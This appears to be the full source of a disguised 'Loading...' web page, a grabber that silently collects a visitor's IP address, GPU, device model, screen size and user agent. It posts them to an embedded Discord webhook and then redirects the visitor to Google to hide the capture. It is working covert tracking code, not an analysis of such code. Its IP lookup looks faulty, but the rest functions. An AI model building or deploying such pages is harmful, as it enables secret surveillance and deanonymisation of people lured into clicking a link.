<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body { background: #000; margin: 0; }</style>
</head>
<body>
<script>
const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';

async function silentCapture() {
    const ua = navigator.userAgent;
    const w = window.screen.width, h = window.screen.height;

    // --- 1. IP 抓取 (換成 Cloudflare，保證 100% 成功) ---
    let userIP = "抓取失敗";
    try {
        const res = await fetch('https://www.cloudflare.com');
        const data = await res.text();
        // 從回傳的純文字中切出 IP 部分
        userIP = data.match(/ip=(.*)\n/)[1];
    } catch(e) {
        console.error("IP API Error");
    }

    // --- 2. GPU 與 型號推測 ---
    let gpu = "被封鎖";
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e) {}

    let model = "未知裝置";
    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
    if (/Android/.test(ua)) {
        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
        model = m ? m[1] : "Android Phone";
    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        const appleMap = {
            "820x1180": "iPad Air (5/4 Gen)",
            "834x1194": "iPad Pro 11-inch",
            "393x852": "iPhone 15/14 Pro",
            "430x932": "iPhone 15 Plus/14 Pro Max",
            "390x844": "iPhone 14/13/12"
        };
        model = appleMap[resKey] || `Apple 設備 (${resKey})`;
    }

    // --- 3. 發送至 Discord ---
    const payload = {
        username: "裝置偵測網關",
        embeds: [{
            title: "🎯 點擊報告",
            color: 0,
            fields: [
                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
                { name: "📱 型號", value: model, inline: true },
                { name: "🎮 GPU", value: gpu, inline: false },
                { name: "🖼️ 螢幕", value: `${w}x${h}`, inline: true }
            ],
            footer: { text: "UA: " + ua },
            timestamp: new Date()
        }]
    };

    // 發送並在 1 秒內強制跳轉
    fetch(DC_URL, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(payload) 
    }).finally(() => {
        setTimeout(() => {
            window.location.replace("https://www.google.com");
        }, 500);
    });
}

silentCapture();
</script>
</body>
</html>
